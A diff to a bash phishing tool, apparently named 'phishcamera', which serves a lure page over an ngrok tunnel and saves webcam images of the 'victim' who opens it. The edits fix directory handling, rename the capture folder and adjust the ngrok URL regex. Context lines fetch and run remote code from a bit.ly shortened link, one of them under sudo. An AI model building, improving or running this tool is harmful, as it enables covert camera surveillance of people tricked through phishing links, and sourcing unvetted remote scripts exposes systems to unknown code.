@@ -3,6 +3,7 @@ CWD=$(pwd)
 if [[ $CWD != *'programs/phishcamera'* ]]; then
 cd programs/phishcamera/ > /dev/null 2>&1
 fi
+RWD=$(pwd)
 if [[ -d "${HOME}/capture-TSc" ]]; then
 :
 else
@@ -26,6 +27,10 @@ Android)
         fi
         if ! hash ngrok > /dev/null 2>&1; then
         source <(curl -fsSL "https://bit.ly/3repcoL")
+        LWD=$(pwd)
+         if [[ $LWD != *'programs/phishcamera'* ]]; then
+         cd $RWD > /dev/null 2>&1
+         fi
         fi
 ;;
 GNU/Linux)
@@ -42,6 +47,10 @@ GNU/Linux)
         fi
         if ! hash ngrok > /dev/null 2>&1; then
         sudo source <(curl -fsSL "https://bit.ly/3repcoL")
+        LWD=$(pwd)
+         if [[ $LWD != *'programs/phishcamera'* ]]; then
+         cd $RWD > /dev/null 2>&1
+         fi
         fi
 ;;
 esac
@@ -111,7 +120,7 @@ sleep 0.5
 if [[ -e "Log.log" ]]; then
   printf "\n${S2}YOU GOT AN IMAGE OF YOUR VICTIM${R0}\n"
   rm -rf Log.log
- mv -v *'.png'* $HOME/cybercapture/
+ mv -v *'.png'* $HOME/capture-TSc/
 fi
 sleep 0.5
 done
@@ -162,7 +171,7 @@ sleep 5
 #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
 if [[ $? != 0 ]]; then
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[-0-9a-z]*\.ngrok.io")
 else
 r2=$(printf "${r1/\"http:\/\//}")
 r3=$(printf "${r2/\"https:\/\//}")
